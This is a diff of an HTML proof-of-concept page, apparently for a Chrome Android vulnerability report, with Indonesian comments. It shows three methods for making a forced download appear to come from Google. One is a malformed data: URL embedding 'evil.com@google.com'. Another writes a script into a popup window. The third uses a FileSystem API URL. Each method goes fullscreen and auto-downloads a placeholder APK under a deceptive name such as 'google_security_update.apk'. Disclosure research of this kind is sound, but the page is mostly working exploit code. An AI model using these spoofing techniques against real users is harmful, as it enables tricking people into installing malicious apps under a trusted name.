@@ -1,55 +1,112 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Download & Fullscreen on Keypress</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Origin Spoofing Research POC</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
+        .btn-container { display: flex; flex-direction: column; gap: 15px; align-items: center; }
+        button { padding: 15px 25px; font-size: 16px; cursor: pointer; width: 300px; border: none; border-radius: 8px; color: white; transition: 0.3s; }
+        .btn-primary { background-color: #4285f4; } /* Blue */
+        .btn-secondary { background-color: #34a853; } /* Green */
+        .btn-danger { background-color: #ea4335; } /* Red */
+        button:hover { opacity: 0.8; }
+        #log { margin-top: 20px; color: #555; font-size: 14px; }
+    </style>
 </head>
 <body>
-  <center><h2>POC by Chigorin!</h2></center>
-  <input type="text" id="triggerInput">
-  <script>
-    document.getElementById('triggerInput').addEventListener('click', function() {
-      // request fullscreen
- setTimeout(function() {
-        openWin();
- }, 2000);
- window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?statcb=0&installdataindex=empty&defaultbrowser=0', '_blank');
-      goFullScreen();
-    }, { once: false }); // Use { once: true } to ensure it only fires once
-    // Download helper
-    function Puf(uri, name) {
-      const link = document.createElement("a");
-      link.href = uri;
-      link.download = name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
-    // Kick off your “APK” download
-    function openWin() {
-      Puf(
-        "data:/\\/evil.com@google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "google.apk"
-      );
-    }
-    function goFullScreen() {
-      const element = document.documentElement;
-      if (element.requestFullscreen) {
-        element.requestFullscreen();
-      } else if (element.mozRequestFullScreen) { // Firefox
-        element.mozRequestFullScreen();
-      } else if (element.webkitRequestFullscreen) { // Chrome, Safari and Opera
-        element.webkitRequestFullscreen();
-      } else if (element.msRequestFullscreen) { // IE/Edge
-        element.msRequestFullscreen();
 
-      }
+    <h2>POC Research: Download Origin Attribution</h2>
+    <p>Target: Chrome Android UI (History & Notification)</p>
 
-    }
+    <div class="btn-container">
+        <!-- Metode 1: Authority Injection (Original Anda) -->
+        <button class="btn-primary" onclick="triggerMethod1()">1. Authority Injection (Data:)</button>
 
-  </script>  
+        <!-- Metode 2: Window Context (Saran #2) -->
+        <button class="btn-secondary" onclick="triggerMethod2()">2. Window Context Spoofing</button>
 
-  
+        <!-- Metode 3: FileSystem API (Saran #3) -->
+        <button class="btn-danger" onclick="triggerMethod3()">3. FileSystem API Scheme</button>
+    </div>
+
+    <div id="log">Status: Ready. Klik salah satu tombol di atas.</div>
+
+    <script>
+        const logger = document.getElementById('log');
+
+        // Helper untuk Fullscreen
+        function goFullScreen() {
+            const el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        }
+
+        // --- METODE 1: Authority Injection (Original Anda) ---
+        function triggerMethod1() {
+            logger.innerText = "Running Method 1...";
+            goFullScreen();
+            setTimeout(() => {
+                const a = document.createElement("a");
+                // Menggunakan payload original Anda
+                a.href = "data:/\\/evil.com@google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=";
+                a.download = "google_security_update.apk";
+                a.click();
+            }, 1000);
+        }
+
+        // --- METODE 2: Window Context Spoofing (Saran #2) ---
+        function triggerMethod2() {
+            logger.innerText = "Running Method 2...";
+            goFullScreen();
+            
+            // Membuka jendela baru untuk memindahkan konteks "Initiator"
+            const win = window.open("", "_blank", "width=100,height=100");
+            if (win) {
+                win.document.write(`
+                    <h3>Loading...</h3>
+                    <script>
+                        const a = document.createElement("a");
+                        a.href = "data:application/vnd.android.package-archive;base64,ZXN0dGVzdGVzdHRlc3Q=";
+                        a.download = "system_update_check.apk";
+                        document.body.appendChild(a);
+                        a.click();
+                        setTimeout(() => { window.close(); }, 1000);
+                    <\/script>
+                `);
+            } else {
+                alert("Pop-up terblokir! Izinkan pop-up untuk test ini.");
+            }
+        }
+
+        // --- METODE 3: FileSystem API (Saran #3) ---
+        function triggerMethod3() {
+            logger.innerText = "Running Method 3...";
+            window.requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;
+
+            if (!window.requestFileSystem) {
+                logger.innerText = "FileSystem API tidak didukung di browser ini.";
+                return;
+            }
+
+            window.requestFileSystem(window.TEMPORARY, 1024 * 1024, function(fs) {
+                fs.root.getFile('update.apk', { create: true }, function(fileEntry) {
+                    fileEntry.createWriter(function(fileWriter) {
+                        const blob = new Blob(['poc_content'], { type: 'application/vnd.android.package-archive' });
+                        fileWriter.onwriteend = function() {
+                            const fsURL = fileEntry.toURL();
+                            logger.innerText = "Triggering filesystem: URL...";
+                            const a = document.createElement("a");
+                            a.href = fsURL;
+                            a.download = "chrome_experimental_feature.apk";
+                            a.click();
+                        };
+                        fileWriter.write(blob);
+                    });
+                });
+            }, (e) => { logger.innerText = "Error FileSystem: " + e.message; });
+        }
+    </script>
 </body>
 </html>
